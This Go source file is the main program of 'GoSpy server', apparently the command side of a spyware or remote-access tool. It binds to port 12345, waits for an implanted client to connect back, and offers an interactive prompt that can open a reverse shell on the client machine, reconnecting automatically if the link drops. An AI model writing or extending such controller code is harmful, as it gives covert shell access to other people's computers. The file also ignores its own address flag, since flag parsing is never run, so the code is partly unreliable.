package main

import (
	"flag"
	"fmt"
	"github.com/c-bata/go-prompt"
	"github.com/psidex/GoSpy/internal/gospyserver/client"
	"github.com/psidex/GoSpy/internal/gospyserver/serverprompt"
	"io"
	"net"
	"os"
	"strings"
)

const banner = `
   ___     ___             ___                      
  / __|___/ __|_ __ _  _  / __| ___ _ ___ _____ _ _ 
 | (_ / _ \__ \ '_ \ || | \__ \/ -_) '_\ V / -_) '_|
  \___\___/___/ .__/\_, | |___/\___|_|  \_/\___|_|  
              |_|   |__/              v0.0.1`

var spyClient client.GoSpyClient

func executor(in string) {
	in = strings.TrimSpace(in)
	blocks := strings.Split(in, " ")

	var err error // So the it can be inspected after the switch.

	switch blocks[0] {
	case "exit":
		os.Exit(0)
	case "ping":
		var resp string
		resp, err = spyClient.Ping()
		if err != nil {
			fmt.Printf("Ping error: %s\n", err.Error())
			break
		}
		fmt.Printf("Recv: %s\n", resp)
	case "reverse-shell":
		err = spyClient.EnterReverseShellRepl()
		if err != nil {
			fmt.Printf("Reverse shell error: %s\n", err.Error())
		}
	}

	if _, isNetErr := err.(*net.OpError); isNetErr == true || err == io.EOF {
		fmt.Println("Client dropped, waiting for reconnect...")
		_ = spyClient.CloseConn()
		_ = spyClient.WaitForConn()
		fmt.Println("Successful reconnect from client")
	}
}

func main() {
	fmt.Printf("%s\n\n", banner)

	bindAddr := *flag.String("b", "0.0.0.0:12345", "the address (ip:port) to bind the gospyserver to")

	fmt.Printf("Listening on %s\n", bindAddr)
	fmt.Println("Waiting for connection from GoSpy client...")

	spyClient = client.NewGoSpyClient(bindAddr)
	err := spyClient.WaitForConn()
	if err != nil {
		fmt.Printf("Error listening on given address: %s\n", err.Error())
		os.Exit(1)
	}

	fmt.Println("Successful connection from client")
	prompt.New(
		executor,
		serverprompt.Completer,
		prompt.OptionTitle("GoSpyServer"),
	).Run()
}
